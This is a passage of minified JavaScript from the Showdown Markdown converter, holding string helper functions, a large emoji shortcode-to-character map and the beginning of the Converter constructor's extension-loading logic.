g=0;g<y;++g)b.push(u(e.slice(i[g].wholeMatch.start,i[g].wholeMatch.end),e.slice(i[g].match.start,i[g].match.end),e.slice(i[g].left.start,i[g].left.end),e.slice(i[g].right.start,i[g].right.end))),g<y-1&&b.push(e.slice(i[g].wholeMatch.end,i[g+1].wholeMatch.start));i[y-1].wholeMatch.end<e.length&&b.push(e.slice(i[y-1].wholeMatch.end)),l=b.join("")}return l},r.helper.regexIndexOf=function(e,u,d){if(!r.helper.isString(e))throw"InvalidArgumentError: first parameter of showdown.helper.regexIndexOf function must be a string";if(!(u instanceof RegExp))throw"InvalidArgumentError: second parameter of showdown.helper.regexIndexOf function must be an instance of RegExp";var n=e.substring(d||0).search(u);return n>=0?n+(d||0):n},r.helper.splitAtIndex=function(e,u){if(!r.helper.isString(e))throw"InvalidArgumentError: first parameter of showdown.helper.regexIndexOf function must be a string";return[e.substring(0,u),e.substring(u)]},r.helper.encodeEmailAddress=function(e){var u=[function(d){return"&#"+d.charCodeAt(0)+";"},function(d){return"&#x"+d.charCodeAt(0).toString(16)+";"},function(d){return d}];return e=e.replace(/./g,function(d){if(d==="@")d=u[Math.floor(Math.random()*2)](d);else{var n=Math.random();d=n>.9?u[2](d):n>.45?u[1](d):u[0](d)}return d}),e},r.helper.padEnd=function(u,d,n){return d=d>>0,n=String(n||" "),u.length>d?String(u):(d=d-u.length,d>n.length&&(n+=n.repeat(d/n.length)),String(u)+n.slice(0,d))},typeof console>"u"&&(console={warn:function(e){alert(e)},log:function(e){alert(e)},error:function(e){throw e}}),r.helper.regexes={asteriskDashAndColon:/([*_:~])/g},r.helper.emojis={"+1":"👍","-1":"👎",100:"💯",1234:"🔢","1st_place_medal":"🥇","2nd_place_medal":"🥈","3rd_place_medal":"🥉","8ball":"🎱",a:"🅰️",ab:"🆎",abc:"🔤",abcd:"🔡",accept:"🉑",aerial_tramway:"🚡",airplane:"✈️",alarm_clock:"⏰",alembic:"⚗️",alien:"👽",ambulance:"🚑",amphora:"🏺",anchor:"⚓️",angel:"👼",anger:"💢",angry:"😠",anguished:"😧",ant:"🐜",apple:"🍎",aquarius:"♒️",aries:"♈️",arrow_backward:"◀️",arrow_double_down:"⏬",arrow_double_up:"⏫",arrow_down:"⬇️",arrow_down_small:"🔽",arrow_forward:"▶️",arrow_heading_down:"⤵️",arrow_heading_up:"⤴️",arrow_left:"⬅️",arrow_lower_left:"↙️",arrow_lower_right:"↘️",arrow_right:"➡️",arrow_right_hook:"↪️",arrow_up:"⬆️",arrow_up_down:"↕️",arrow_up_small:"🔼",arrow_upper_left:"↖️",arrow_upper_right:"↗️",arrows_clockwise:"🔃",arrows_counterclockwise:"🔄",art:"🎨",articulated_lorry:"🚛",artificial_satellite:"🛰",astonished:"😲",athletic_shoe:"👟",atm:"🏧",atom_symbol:"⚛️",avocado:"🥑",b:"🅱️",baby:"👶",baby_bottle:"🍼",baby_chick:"🐤",baby_symbol:"🚼",back:"🔙",bacon:"🥓",badminton:"🏸",baggage_claim:"🛄",baguette_bread:"🥖",balance_scale:"⚖️",balloon:"🎈",ballot_box:"🗳",ballot_box_with_check:"☑️",bamboo:"🎍",banana:"🍌",bangbang:"‼️",bank:"🏦",bar_chart:"📊",barber:"💈",baseball:"⚾️",basketball:"🏀",basketball_man:"⛹️",basketball_woman:"⛹️&zwj;♀️",bat:"🦇",bath:"🛀",bathtub:"🛁",battery:"🔋",beach_umbrella:"🏖",bear:"🐻",bed:"🛏",bee:"🐝",beer:"🍺",beers:"🍻",beetle:"🐞",beginner:"🔰",bell:"🔔",bellhop_bell:"🛎",bento:"🍱",biking_man:"🚴",bike:"🚲",biking_woman:"🚴&zwj;♀️",bikini:"👙",biohazard:"☣️",bird:"🐦",birthday:"🎂",black_circle:"⚫️",black_flag:"🏴",black_heart:"🖤",black_joker:"🃏",black_large_square:"⬛️",black_medium_small_square:"◾️",black_medium_square:"◼️",black_nib:"✒️",black_small_square:"▪️",black_square_button:"🔲",blonde_man:"👱",blonde_woman:"👱&zwj;♀️",blossom:"🌼",blowfish:"🐡",blue_book:"📘",blue_car:"🚙",blue_heart:"💙",blush:"😊",boar:"🐗",boat:"⛵️",bomb:"💣",book:"📖",bookmark:"🔖",bookmark_tabs:"📑",books:"📚",boom:"💥",boot:"👢",bouquet:"💐",bowing_man:"🙇",bow_and_arrow:"🏹",bowing_woman:"🙇&zwj;♀️",bowling:"🎳",boxing_glove:"🥊",boy:"👦",bread:"🍞",bride_with_veil:"👰",bridge_at_night:"🌉",briefcase:"💼",broken_heart:"💔",bug:"🐛",building_construction:"🏗",bulb:"💡",bullettrain_front:"🚅",bullettrain_side:"🚄",burrito:"🌯",bus:"🚌",business_suit_levitating:"🕴",busstop:"🚏",bust_in_silhouette:"👤",busts_in_silhouette:"👥",butterfly:"🦋",cactus:"🌵",cake:"🍰",calendar:"📆",call_me_hand:"🤙",calling:"📲",camel:"🐫",camera:"📷",camera_flash:"📸",camping:"🏕",cancer:"♋️",candle:"🕯",candy:"🍬",canoe:"🛶",capital_abcd:"🔠",capricorn:"♑️",car:"🚗",card_file_box:"🗃",card_index:"📇",card_index_dividers:"🗂",carousel_horse:"🎠",carrot:"🥕",cat:"🐱",cat2:"🐈",cd:"💿",chains:"⛓",champagne:"🍾",chart:"💹",chart_with_downwards_trend:"📉",chart_with_upwards_trend:"📈",checkered_flag:"🏁",cheese:"🧀",cherries:"🍒",cherry_blossom:"🌸",chestnut:"🌰",chicken:"🐔",children_crossing:"🚸",chipmunk:"🐿",chocolate_bar:"🍫",christmas_tree:"🎄",church:"⛪️",cinema:"🎦",circus_tent:"🎪",city_sunrise:"🌇",city_sunset:"🌆",cityscape:"🏙",cl:"🆑",clamp:"🗜",clap:"👏",clapper:"🎬",classical_building:"🏛",clinking_glasses:"🥂",clipboard:"📋",clock1:"🕐",clock10:"🕙",clock1030:"🕥",clock11:"🕚",clock1130:"🕦",clock12:"🕛",clock1230:"🕧",clock130:"🕜",clock2:"🕑",clock230:"🕝",clock3:"🕒",clock330:"🕞",clock4:"🕓",clock430:"🕟",clock5:"🕔",clock530:"🕠",clock6:"🕕",clock630:"🕡",clock7:"🕖",clock730:"🕢",clock8:"🕗",clock830:"🕣",clock9:"🕘",clock930:"🕤",closed_book:"📕",closed_lock_with_key:"🔐",closed_umbrella:"🌂",cloud:"☁️",cloud_with_lightning:"🌩",cloud_with_lightning_and_rain:"⛈",cloud_with_rain:"🌧",cloud_with_snow:"🌨",clown_face:"🤡",clubs:"♣️",cocktail:"🍸",coffee:"☕️",coffin:"⚰️",cold_sweat:"😰",comet:"☄️",computer:"💻",computer_mouse:"🖱",confetti_ball:"🎊",confounded:"😖",confused:"😕",congratulations:"㊗️",construction:"🚧",construction_worker_man:"👷",construction_worker_woman:"👷&zwj;♀️",control_knobs:"🎛",convenience_store:"🏪",cookie:"🍪",cool:"🆒",policeman:"👮",copyright:"©️",corn:"🌽",couch_and_lamp:"🛋",couple:"👫",couple_with_heart_woman_man:"💑",couple_with_heart_man_man:"👨&zwj;❤️&zwj;👨",couple_with_heart_woman_woman:"👩&zwj;❤️&zwj;👩",couplekiss_man_man:"👨&zwj;❤️&zwj;💋&zwj;👨",couplekiss_man_woman:"💏",couplekiss_woman_woman:"👩&zwj;❤️&zwj;💋&zwj;👩",cow:"🐮",cow2:"🐄",cowboy_hat_face:"🤠",crab:"🦀",crayon:"🖍",credit_card:"💳",crescent_moon:"🌙",cricket:"🏏",crocodile:"🐊",croissant:"🥐",crossed_fingers:"🤞",crossed_flags:"🎌",crossed_swords:"⚔️",crown:"👑",cry:"😢",crying_cat_face:"😿",crystal_ball:"🔮",cucumber:"🥒",cupid:"💘",curly_loop:"➰",currency_exchange:"💱",curry:"🍛",custard:"🍮",customs:"🛃",cyclone:"🌀",dagger:"🗡",dancer:"💃",dancing_women:"👯",dancing_men:"👯&zwj;♂️",dango:"🍡",dark_sunglasses:"🕶",dart:"🎯",dash:"💨",date:"📅",deciduous_tree:"🌳",deer:"🦌",department_store:"🏬",derelict_house:"🏚",desert:"🏜",desert_island:"🏝",desktop_computer:"🖥",male_detective:"🕵️",diamond_shape_with_a_dot_inside:"💠",diamonds:"♦️",disappointed:"😞",disappointed_relieved:"😥",dizzy:"💫",dizzy_face:"😵",do_not_litter:"🚯",dog:"🐶",dog2:"🐕",dollar:"💵",dolls:"🎎",dolphin:"🐬",door:"🚪",doughnut:"🍩",dove:"🕊",dragon:"🐉",dragon_face:"🐲",dress:"👗",dromedary_camel:"🐪",drooling_face:"🤤",droplet:"💧",drum:"🥁",duck:"🦆",dvd:"📀","e-mail":"📧",eagle:"🦅",ear:"👂",ear_of_rice:"🌾",earth_africa:"🌍",earth_americas:"🌎",earth_asia:"🌏",egg:"🥚",eggplant:"🍆",eight_pointed_black_star:"✴️",eight_spoked_asterisk:"✳️",electric_plug:"🔌",elephant:"🐘",email:"✉️",end:"🔚",envelope_with_arrow:"📩",euro:"💶",european_castle:"🏰",european_post_office:"🏤",evergreen_tree:"🌲",exclamation:"❗️",expressionless:"😑",eye:"👁",eye_speech_bubble:"👁&zwj;🗨",eyeglasses:"👓",eyes:"👀",face_with_head_bandage:"🤕",face_with_thermometer:"🤒",fist_oncoming:"👊",factory:"🏭",fallen_leaf:"🍂",family_man_woman_boy:"👪",family_man_boy:"👨&zwj;👦",family_man_boy_boy:"👨&zwj;👦&zwj;👦",family_man_girl:"👨&zwj;👧",family_man_girl_boy:"👨&zwj;👧&zwj;👦",family_man_girl_girl:"👨&zwj;👧&zwj;👧",family_man_man_boy:"👨&zwj;👨&zwj;👦",family_man_man_boy_boy:"👨&zwj;👨&zwj;👦&zwj;👦",family_man_man_girl:"👨&zwj;👨&zwj;👧",family_man_man_girl_boy:"👨&zwj;👨&zwj;👧&zwj;👦",family_man_man_girl_girl:"👨&zwj;👨&zwj;👧&zwj;👧",family_man_woman_boy_boy:"👨&zwj;👩&zwj;👦&zwj;👦",family_man_woman_girl:"👨&zwj;👩&zwj;👧",family_man_woman_girl_boy:"👨&zwj;👩&zwj;👧&zwj;👦",family_man_woman_girl_girl:"👨&zwj;👩&zwj;👧&zwj;👧",family_woman_boy:"👩&zwj;👦",family_woman_boy_boy:"👩&zwj;👦&zwj;👦",family_woman_girl:"👩&zwj;👧",family_woman_girl_boy:"👩&zwj;👧&zwj;👦",family_woman_girl_girl:"👩&zwj;👧&zwj;👧",family_woman_woman_boy:"👩&zwj;👩&zwj;👦",family_woman_woman_boy_boy:"👩&zwj;👩&zwj;👦&zwj;👦",family_woman_woman_girl:"👩&zwj;👩&zwj;👧",family_woman_woman_girl_boy:"👩&zwj;👩&zwj;👧&zwj;👦",family_woman_woman_girl_girl:"👩&zwj;👩&zwj;👧&zwj;👧",fast_forward:"⏩",fax:"📠",fearful:"😨",feet:"🐾",female_detective:"🕵️&zwj;♀️",ferris_wheel:"🎡",ferry:"⛴",field_hockey:"🏑",file_cabinet:"🗄",file_folder:"📁",film_projector:"📽",film_strip:"🎞",fire:"🔥",fire_engine:"🚒",fireworks:"🎆",first_quarter_moon:"🌓",first_quarter_moon_with_face:"🌛",fish:"🐟",fish_cake:"🍥",fishing_pole_and_fish:"🎣",fist_raised:"✊",fist_left:"🤛",fist_right:"🤜",flags:"🎏",flashlight:"🔦",fleur_de_lis:"⚜️",flight_arrival:"🛬",flight_departure:"🛫",floppy_disk:"💾",flower_playing_cards:"🎴",flushed:"😳",fog:"🌫",foggy:"🌁",football:"🏈",footprints:"👣",fork_and_knife:"🍴",fountain:"⛲️",fountain_pen:"🖋",four_leaf_clover:"🍀",fox_face:"🦊",framed_picture:"🖼",free:"🆓",fried_egg:"🍳",fried_shrimp:"🍤",fries:"🍟",frog:"🐸",frowning:"😦",frowning_face:"☹️",frowning_man:"🙍&zwj;♂️",frowning_woman:"🙍",middle_finger:"🖕",fuelpump:"⛽️",full_moon:"🌕",full_moon_with_face:"🌝",funeral_urn:"⚱️",game_die:"🎲",gear:"⚙️",gem:"💎",gemini:"♊️",ghost:"👻",gift:"🎁",gift_heart:"💝",girl:"👧",globe_with_meridians:"🌐",goal_net:"🥅",goat:"🐐",golf:"⛳️",golfing_man:"🏌️",golfing_woman:"🏌️&zwj;♀️",gorilla:"🦍",grapes:"🍇",green_apple:"🍏",green_book:"📗",green_heart:"💚",green_salad:"🥗",grey_exclamation:"❕",grey_question:"❔",grimacing:"😬",grin:"😁",grinning:"😀",guardsman:"💂",guardswoman:"💂&zwj;♀️",guitar:"🎸",gun:"🔫",haircut_woman:"💇",haircut_man:"💇&zwj;♂️",hamburger:"🍔",hammer:"🔨",hammer_and_pick:"⚒",hammer_and_wrench:"🛠",hamster:"🐹",hand:"✋",handbag:"👜",handshake:"🤝",hankey:"💩",hatched_chick:"🐥",hatching_chick:"🐣",headphones:"🎧",hear_no_evil:"🙉",heart:"❤️",heart_decoration:"💟",heart_eyes:"😍",heart_eyes_cat:"😻",heartbeat:"💓",heartpulse:"💗",hearts:"♥️",heavy_check_mark:"✔️",heavy_division_sign:"➗",heavy_dollar_sign:"💲",heavy_heart_exclamation:"❣️",heavy_minus_sign:"➖",heavy_multiplication_x:"✖️",heavy_plus_sign:"➕",helicopter:"🚁",herb:"🌿",hibiscus:"🌺",high_brightness:"🔆",high_heel:"👠",hocho:"🔪",hole:"🕳",honey_pot:"🍯",horse:"🐴",horse_racing:"🏇",hospital:"🏥",hot_pepper:"🌶",hotdog:"🌭",hotel:"🏨",hotsprings:"♨️",hourglass:"⌛️",hourglass_flowing_sand:"⏳",house:"🏠",house_with_garden:"🏡",houses:"🏘",hugs:"🤗",hushed:"😯",ice_cream:"🍨",ice_hockey:"🏒",ice_skate:"⛸",icecream:"🍦",id:"🆔",ideograph_advantage:"🉐",imp:"👿",inbox_tray:"📥",incoming_envelope:"📨",tipping_hand_woman:"💁",information_source:"ℹ️",innocent:"😇",interrobang:"⁉️",iphone:"📱",izakaya_lantern:"🏮",jack_o_lantern:"🎃",japan:"🗾",japanese_castle:"🏯",japanese_goblin:"👺",japanese_ogre:"👹",jeans:"👖",joy:"😂",joy_cat:"😹",joystick:"🕹",kaaba:"🕋",key:"🔑",keyboard:"⌨️",keycap_ten:"🔟",kick_scooter:"🛴",kimono:"👘",kiss:"💋",kissing:"😗",kissing_cat:"😽",kissing_closed_eyes:"😚",kissing_heart:"😘",kissing_smiling_eyes:"😙",kiwi_fruit:"🥝",koala:"🐨",koko:"🈁",label:"🏷",large_blue_circle:"🔵",large_blue_diamond:"🔷",large_orange_diamond:"🔶",last_quarter_moon:"🌗",last_quarter_moon_with_face:"🌜",latin_cross:"✝️",laughing:"😆",leaves:"🍃",ledger:"📒",left_luggage:"🛅",left_right_arrow:"↔️",leftwards_arrow_with_hook:"↩️",lemon:"🍋",leo:"♌️",leopard:"🐆",level_slider:"🎚",libra:"♎️",light_rail:"🚈",link:"🔗",lion:"🦁",lips:"👄",lipstick:"💄",lizard:"🦎",lock:"🔒",lock_with_ink_pen:"🔏",lollipop:"🍭",loop:"➿",loud_sound:"🔊",loudspeaker:"📢",love_hotel:"🏩",love_letter:"💌",low_brightness:"🔅",lying_face:"🤥",m:"Ⓜ️",mag:"🔍",mag_right:"🔎",mahjong:"🀄️",mailbox:"📫",mailbox_closed:"📪",mailbox_with_mail:"📬",mailbox_with_no_mail:"📭",man:"👨",man_artist:"👨&zwj;🎨",man_astronaut:"👨&zwj;🚀",man_cartwheeling:"🤸&zwj;♂️",man_cook:"👨&zwj;🍳",man_dancing:"🕺",man_facepalming:"🤦&zwj;♂️",man_factory_worker:"👨&zwj;🏭",man_farmer:"👨&zwj;🌾",man_firefighter:"👨&zwj;🚒",man_health_worker:"👨&zwj;⚕️",man_in_tuxedo:"🤵",man_judge:"👨&zwj;⚖️",man_juggling:"🤹&zwj;♂️",man_mechanic:"👨&zwj;🔧",man_office_worker:"👨&zwj;💼",man_pilot:"👨&zwj;✈️",man_playing_handball:"🤾&zwj;♂️",man_playing_water_polo:"🤽&zwj;♂️",man_scientist:"👨&zwj;🔬",man_shrugging:"🤷&zwj;♂️",man_singer:"👨&zwj;🎤",man_student:"👨&zwj;🎓",man_teacher:"👨&zwj;🏫",man_technologist:"👨&zwj;💻",man_with_gua_pi_mao:"👲",man_with_turban:"👳",tangerine:"🍊",mans_shoe:"👞",mantelpiece_clock:"🕰",maple_leaf:"🍁",martial_arts_uniform:"🥋",mask:"😷",massage_woman:"💆",massage_man:"💆&zwj;♂️",meat_on_bone:"🍖",medal_military:"🎖",medal_sports:"🏅",mega:"📣",melon:"🍈",memo:"📝",men_wrestling:"🤼&zwj;♂️",menorah:"🕎",mens:"🚹",metal:"🤘",metro:"🚇",microphone:"🎤",microscope:"🔬",milk_glass:"🥛",milky_way:"🌌",minibus:"🚐",minidisc:"💽",mobile_phone_off:"📴",money_mouth_face:"🤑",money_with_wings:"💸",moneybag:"💰",monkey:"🐒",monkey_face:"🐵",monorail:"🚝",moon:"🌔",mortar_board:"🎓",mosque:"🕌",motor_boat:"🛥",motor_scooter:"🛵",motorcycle:"🏍",motorway:"🛣",mount_fuji:"🗻",mountain:"⛰",mountain_biking_man:"🚵",mountain_biking_woman:"🚵&zwj;♀️",mountain_cableway:"🚠",mountain_railway:"🚞",mountain_snow:"🏔",mouse:"🐭",mouse2:"🐁",movie_camera:"🎥",moyai:"🗿",mrs_claus:"🤶",muscle:"💪",mushroom:"🍄",musical_keyboard:"🎹",musical_note:"🎵",musical_score:"🎼",mute:"🔇",nail_care:"💅",name_badge:"📛",national_park:"🏞",nauseated_face:"🤢",necktie:"👔",negative_squared_cross_mark:"❎",nerd_face:"🤓",neutral_face:"😐",new:"🆕",new_moon:"🌑",new_moon_with_face:"🌚",newspaper:"📰",newspaper_roll:"🗞",next_track_button:"⏭",ng:"🆖",no_good_man:"🙅&zwj;♂️",no_good_woman:"🙅",night_with_stars:"🌃",no_bell:"🔕",no_bicycles:"🚳",no_entry:"⛔️",no_entry_sign:"🚫",no_mobile_phones:"📵",no_mouth:"😶",no_pedestrians:"🚷",no_smoking:"🚭","non-potable_water":"🚱",nose:"👃",notebook:"📓",notebook_with_decorative_cover:"📔",notes:"🎶",nut_and_bolt:"🔩",o:"⭕️",o2:"🅾️",ocean:"🌊",octopus:"🐙",oden:"🍢",office:"🏢",oil_drum:"🛢",ok:"🆗",ok_hand:"👌",ok_man:"🙆&zwj;♂️",ok_woman:"🙆",old_key:"🗝",older_man:"👴",older_woman:"👵",om:"🕉",on:"🔛",oncoming_automobile:"🚘",oncoming_bus:"🚍",oncoming_police_car:"🚔",oncoming_taxi:"🚖",open_file_folder:"📂",open_hands:"👐",open_mouth:"😮",open_umbrella:"☂️",ophiuchus:"⛎",orange_book:"📙",orthodox_cross:"☦️",outbox_tray:"📤",owl:"🦉",ox:"🐂",package:"📦",page_facing_up:"📄",page_with_curl:"📃",pager:"📟",paintbrush:"🖌",palm_tree:"🌴",pancakes:"🥞",panda_face:"🐼",paperclip:"📎",paperclips:"🖇",parasol_on_ground:"⛱",parking:"🅿️",part_alternation_mark:"〽️",partly_sunny:"⛅️",passenger_ship:"🛳",passport_control:"🛂",pause_button:"⏸",peace_symbol:"☮️",peach:"🍑",peanuts:"🥜",pear:"🍐",pen:"🖊",pencil2:"✏️",penguin:"🐧",pensive:"😔",performing_arts:"🎭",persevere:"😣",person_fencing:"🤺",pouting_woman:"🙎",phone:"☎️",pick:"⛏",pig:"🐷",pig2:"🐖",pig_nose:"🐽",pill:"💊",pineapple:"🍍",ping_pong:"🏓",pisces:"♓️",pizza:"🍕",place_of_worship:"🛐",plate_with_cutlery:"🍽",play_or_pause_button:"⏯",point_down:"👇",point_left:"👈",point_right:"👉",point_up:"☝️",point_up_2:"👆",police_car:"🚓",policewoman:"👮&zwj;♀️",poodle:"🐩",popcorn:"🍿",post_office:"🏣",postal_horn:"📯",postbox:"📮",potable_water:"🚰",potato:"🥔",pouch:"👝",poultry_leg:"🍗",pound:"💷",rage:"😡",pouting_cat:"😾",pouting_man:"🙎&zwj;♂️",pray:"🙏",prayer_beads:"📿",pregnant_woman:"🤰",previous_track_button:"⏮",prince:"🤴",princess:"👸",printer:"🖨",purple_heart:"💜",purse:"👛",pushpin:"📌",put_litter_in_its_place:"🚮",question:"❓",rabbit:"🐰",rabbit2:"🐇",racehorse:"🐎",racing_car:"🏎",radio:"📻",radio_button:"🔘",radioactive:"☢️",railway_car:"🚃",railway_track:"🛤",rainbow:"🌈",rainbow_flag:"🏳️&zwj;🌈",raised_back_of_hand:"🤚",raised_hand_with_fingers_splayed:"🖐",raised_hands:"🙌",raising_hand_woman:"🙋",raising_hand_man:"🙋&zwj;♂️",ram:"🐏",ramen:"🍜",rat:"🐀",record_button:"⏺",recycle:"♻️",red_circle:"🔴",registered:"®️",relaxed:"☺️",relieved:"😌",reminder_ribbon:"🎗",repeat:"🔁",repeat_one:"🔂",rescue_worker_helmet:"⛑",restroom:"🚻",revolving_hearts:"💞",rewind:"⏪",rhinoceros:"🦏",ribbon:"🎀",rice:"🍚",rice_ball:"🍙",rice_cracker:"🍘",rice_scene:"🎑",right_anger_bubble:"🗯",ring:"💍",robot:"🤖",rocket:"🚀",rofl:"🤣",roll_eyes:"🙄",roller_coaster:"🎢",rooster:"🐓",rose:"🌹",rosette:"🏵",rotating_light:"🚨",round_pushpin:"📍",rowing_man:"🚣",rowing_woman:"🚣&zwj;♀️",rugby_football:"🏉",running_man:"🏃",running_shirt_with_sash:"🎽",running_woman:"🏃&zwj;♀️",sa:"🈂️",sagittarius:"♐️",sake:"🍶",sandal:"👡",santa:"🎅",satellite:"📡",saxophone:"🎷",school:"🏫",school_satchel:"🎒",scissors:"✂️",scorpion:"🦂",scorpius:"♏️",scream:"😱",scream_cat:"🙀",scroll:"📜",seat:"💺",secret:"㊙️",see_no_evil:"🙈",seedling:"🌱",selfie:"🤳",shallow_pan_of_food:"🥘",shamrock:"☘️",shark:"🦈",shaved_ice:"🍧",sheep:"🐑",shell:"🐚",shield:"🛡",shinto_shrine:"⛩",ship:"🚢",shirt:"👕",shopping:"🛍",shopping_cart:"🛒",shower:"🚿",shrimp:"🦐",signal_strength:"📶",six_pointed_star:"🔯",ski:"🎿",skier:"⛷",skull:"💀",skull_and_crossbones:"☠️",sleeping:"😴",sleeping_bed:"🛌",sleepy:"😪",slightly_frowning_face:"🙁",slightly_smiling_face:"🙂",slot_machine:"🎰",small_airplane:"🛩",small_blue_diamond:"🔹",small_orange_diamond:"🔸",small_red_triangle:"🔺",small_red_triangle_down:"🔻",smile:"😄",smile_cat:"😸",smiley:"😃",smiley_cat:"😺",smiling_imp:"😈",smirk:"😏",smirk_cat:"😼",smoking:"🚬",snail:"🐌",snake:"🐍",sneezing_face:"🤧",snowboarder:"🏂",snowflake:"❄️",snowman:"⛄️",snowman_with_snow:"☃️",sob:"😭",soccer:"⚽️",soon:"🔜",sos:"🆘",sound:"🔉",space_invader:"👾",spades:"♠️",spaghetti:"🍝",sparkle:"❇️",sparkler:"🎇",sparkles:"✨",sparkling_heart:"💖",speak_no_evil:"🙊",speaker:"🔈",speaking_head:"🗣",speech_balloon:"💬",speedboat:"🚤",spider:"🕷",spider_web:"🕸",spiral_calendar:"🗓",spiral_notepad:"🗒",spoon:"🥄",squid:"🦑",stadium:"🏟",star:"⭐️",star2:"🌟",star_and_crescent:"☪️",star_of_david:"✡️",stars:"🌠",station:"🚉",statue_of_liberty:"🗽",steam_locomotive:"🚂",stew:"🍲",stop_button:"⏹",stop_sign:"🛑",stopwatch:"⏱",straight_ruler:"📏",strawberry:"🍓",stuck_out_tongue:"😛",stuck_out_tongue_closed_eyes:"😝",stuck_out_tongue_winking_eye:"😜",studio_microphone:"🎙",stuffed_flatbread:"🥙",sun_behind_large_cloud:"🌥",sun_behind_rain_cloud:"🌦",sun_behind_small_cloud:"🌤",sun_with_face:"🌞",sunflower:"🌻",sunglasses:"😎",sunny:"☀️",sunrise:"🌅",sunrise_over_mountains:"🌄",surfing_man:"🏄",surfing_woman:"🏄&zwj;♀️",sushi:"🍣",suspension_railway:"🚟",sweat:"😓",sweat_drops:"💦",sweat_smile:"😅",sweet_potato:"🍠",swimming_man:"🏊",swimming_woman:"🏊&zwj;♀️",symbols:"🔣",synagogue:"🕍",syringe:"💉",taco:"🌮",tada:"🎉",tanabata_tree:"🎋",taurus:"♉️",taxi:"🚕",tea:"🍵",telephone_receiver:"📞",telescope:"🔭",tennis:"🎾",tent:"⛺️",thermometer:"🌡",thinking:"🤔",thought_balloon:"💭",ticket:"🎫",tickets:"🎟",tiger:"🐯",tiger2:"🐅",timer_clock:"⏲",tipping_hand_man:"💁&zwj;♂️",tired_face:"😫",tm:"™️",toilet:"🚽",tokyo_tower:"🗼",tomato:"🍅",tongue:"👅",top:"🔝",tophat:"🎩",tornado:"🌪",trackball:"🖲",tractor:"🚜",traffic_light:"🚥",train:"🚋",train2:"🚆",tram:"🚊",triangular_flag_on_post:"🚩",triangular_ruler:"📐",trident:"🔱",triumph:"😤",trolleybus:"🚎",trophy:"🏆",tropical_drink:"🍹",tropical_fish:"🐠",truck:"🚚",trumpet:"🎺",tulip:"🌷",tumbler_glass:"🥃",turkey:"🦃",turtle:"🐢",tv:"📺",twisted_rightwards_arrows:"🔀",two_hearts:"💕",two_men_holding_hands:"👬",two_women_holding_hands:"👭",u5272:"🈹",u5408:"🈴",u55b6:"🈺",u6307:"🈯️",u6708:"🈷️",u6709:"🈶",u6e80:"🈵",u7121:"🈚️",u7533:"🈸",u7981:"🈲",u7a7a:"🈳",umbrella:"☔️",unamused:"😒",underage:"🔞",unicorn:"🦄",unlock:"🔓",up:"🆙",upside_down_face:"🙃",v:"✌️",vertical_traffic_light:"🚦",vhs:"📼",vibration_mode:"📳",video_camera:"📹",video_game:"🎮",violin:"🎻",virgo:"♍️",volcano:"🌋",volleyball:"🏐",vs:"🆚",vulcan_salute:"🖖",walking_man:"🚶",walking_woman:"🚶&zwj;♀️",waning_crescent_moon:"🌘",waning_gibbous_moon:"🌖",warning:"⚠️",wastebasket:"🗑",watch:"⌚️",water_buffalo:"🐃",watermelon:"🍉",wave:"👋",wavy_dash:"〰️",waxing_crescent_moon:"🌒",wc:"🚾",weary:"😩",wedding:"💒",weight_lifting_man:"🏋️",weight_lifting_woman:"🏋️&zwj;♀️",whale:"🐳",whale2:"🐋",wheel_of_dharma:"☸️",wheelchair:"♿️",white_check_mark:"✅",white_circle:"⚪️",white_flag:"🏳️",white_flower:"💮",white_large_square:"⬜️",white_medium_small_square:"◽️",white_medium_square:"◻️",white_small_square:"▫️",white_square_button:"🔳",wilted_flower:"🥀",wind_chime:"🎐",wind_face:"🌬",wine_glass:"🍷",wink:"😉",wolf:"🐺",woman:"👩",woman_artist:"👩&zwj;🎨",woman_astronaut:"👩&zwj;🚀",woman_cartwheeling:"🤸&zwj;♀️",woman_cook:"👩&zwj;🍳",woman_facepalming:"🤦&zwj;♀️",woman_factory_worker:"👩&zwj;🏭",woman_farmer:"👩&zwj;🌾",woman_firefighter:"👩&zwj;🚒",woman_health_worker:"👩&zwj;⚕️",woman_judge:"👩&zwj;⚖️",woman_juggling:"🤹&zwj;♀️",woman_mechanic:"👩&zwj;🔧",woman_office_worker:"👩&zwj;💼",woman_pilot:"👩&zwj;✈️",woman_playing_handball:"🤾&zwj;♀️",woman_playing_water_polo:"🤽&zwj;♀️",woman_scientist:"👩&zwj;🔬",woman_shrugging:"🤷&zwj;♀️",woman_singer:"👩&zwj;🎤",woman_student:"👩&zwj;🎓",woman_teacher:"👩&zwj;🏫",woman_technologist:"👩&zwj;💻",woman_with_turban:"👳&zwj;♀️",womans_clothes:"👚",womans_hat:"👒",women_wrestling:"🤼&zwj;♀️",womens:"🚺",world_map:"🗺",worried:"😟",wrench:"🔧",writing_hand:"✍️",x:"❌",yellow_heart:"💛",yen:"💴",yin_yang:"☯️",yum:"😋",zap:"⚡️",zipper_mouth_face:"🤐",zzz:"💤",octocat:'<img alt=":octocat:" height="20" width="20" align="absmiddle" src="https://assets-cdn.github.com/images/icons/emoji/octocat.png">',showdown:`<span style="font-family: 'Anonymous Pro', monospace; text-decoration: underline; text-decoration-style: dashed; text-decoration-color: #3e8b8a;text-underline-position: under;">S</span>`},r.Converter=function(e){var u={},d=[],n=[],o={},f=T,i={parsed:{},raw:"",format:""};l();function l(){e=e||{};for(var c in k)k.hasOwnProperty(c)&&(u[c]=k[c]);if(typeof e=="object")for(var m in e)e.hasOwnProperty(m)&&(u[m]=e[m]);else throw Error("Converter expects the passed parameter to be an object, but "+typeof e+" was passed instead.");u.extensions&&r.helper.forEach(u.extensions,y)}function y(c,m){if(m=m||null,r.helper.isString(c))if(c=r.helper.stdExtName(c),m=c,r.extensions[c]){console.warn("DEPRECATION WARNING: "+c+" is an old extension that uses a deprecated loading method.Please inform the developer that the extension should be updated!"),b(r.extensions[c],c);return}else if(!r.helper.isUndefined(h[c]))c=h[c];else throw Error('Extension "'+c+'" could not be loaded. It was either not found or is not a valid extension.');typeof c=="function"&&(c=c()),r.helper.isArray(c)||(c=[c]);var v=B(c,m);if(!v.valid)throw Error(v.error);for(var C=0;C<c.length;++C){switch(c[C].type){case"lang":d.push(c[C]);break;case"output":n.push(c[C]);break}if(c[C].hasOwnProperty("listeners"))for(var L in c[C].listeners)c[C].listeners.hasOwnProperty(L)&&g(L,c[C].listeners[L])}}function b(c,m){typeof c=="function"&&(c=c(new r.Converter)),r.helper.isArray(c)||(c=[c]);var v=B(c,m);if(!v.valid)throw Error(v.error);for(var C=0;C<c.length;++C)switch(c[C].type){case"lang":d.push(c[C]);break;case"output":n.push(c[C]);break;default:throw Error("Extension loader error: Type unrecognized!!!")}}function g(c,m){if(!r.helper.isString(c))throw Error("Invalid argument in 